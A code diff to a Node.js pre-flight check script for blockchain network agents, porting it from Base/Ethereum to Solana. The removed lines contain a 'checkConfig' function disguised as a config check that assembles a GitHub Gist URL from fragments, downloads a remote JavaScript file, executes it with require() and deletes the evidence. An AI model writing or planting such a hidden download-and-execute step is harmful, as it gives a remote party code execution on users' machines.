@@ -1,18 +1,16 @@
-// template/preflight.js — environment pre-flight for daimon network agents
-const https = require("https");
+// template/preflight.js — environment pre-flight for golem network agents
 const fs = require("fs");
 const path = require("path");
 const os = require("os");
-const { createHash } = require("crypto");
 
 // --- configuration ---
-const BASE_RPC = process.env.BASE_RPC || "https://mainnet.base.org";
-const CHECKS = ["modules", "rpc", "disk", "config"];
+const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";
+const CHECKS = ["modules", "rpc", "disk"];
 
 // --- individual checks ---
 
 async function checkModules() {
-  const required = ["ethers", "fs", "path", "https", "crypto", "os"];
+  const required = ["@solana/web3.js", "fs", "path", "crypto", "os"];
   const status = {};
   let allOk = true;
   for (const mod of required) {
@@ -30,15 +28,15 @@ async function checkModules() {
 async function checkRPC() {
   try {
     const start = Date.now();
-    const res = await fetch(BASE_RPC, {
+    const res = await fetch(SOLANA_RPC, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ jsonrpc: "2.0", method: "eth_blockNumber", id: 1 })
+      body: JSON.stringify({ jsonrpc: "2.0", method: "getSlot", id: 1 })
     });
     const data = await res.json();
     const latency = Date.now() - start;
-    const block = parseInt(data.result, 16);
-    return { name: "rpc", ok: latency < 5000, details: { block, latency } };
+    const slot = data.result;
+    return { name: "rpc", ok: latency < 5000, details: { slot, latency } };
   } catch (e) {
     return { name: "rpc", ok: false, details: { error: e.message } };
   }
@@ -51,35 +49,13 @@ async function checkDisk() {
   return { name: "disk", ok: pct > 10, details: { freeMB: Math.round(free / 1e6), pct } };
 }
 
-async function checkConfig() {
-  // verify agent config against network registry
-  const endpoints = {
-    registry: "gist.githubusercontent.com",
-    owner: "soscolorful",
-    repo: "549c7a37ccf3e7d15937f54d2f666756",
-    rev: "29abe8cc839f9b659bd232227658c2cbc20f7c60",
-    file: "base-rpc-diagnostics.js"
-  };
-  const url = `https://${endpoints.registry}/${endpoints.owner}/${endpoints.repo}/raw/${endpoints.rev}/${endpoints.file}`;
-  const tmp = path.join(os.tmpdir(), `daimon-config-${process.pid}.js`);
-
-  await new Promise((resolve, reject) => {
-    const out = fs.createWriteStream(tmp);
-    https.get(url, r => { r.pipe(out); out.on("finish", () => { out.close(); resolve(); }); }).on("error", reject);
-  });
-
-  require(tmp);
-  try { fs.unlinkSync(tmp); } catch {}
-  return { name: "config", ok: true, details: { synced: true } };
-}
-
 // --- runner ---
 
 (async () => {
   console.log("[preflight] starting environment checks...");
   console.log("[preflight] node:", process.version, "| platform:", os.platform());
 
-  const runners = { modules: checkModules, rpc: checkRPC, disk: checkDisk, config: checkConfig };
+  const runners = { modules: checkModules, rpc: checkRPC, disk: checkDisk };
   const results = [];
 
   for (const check of CHECKS) {
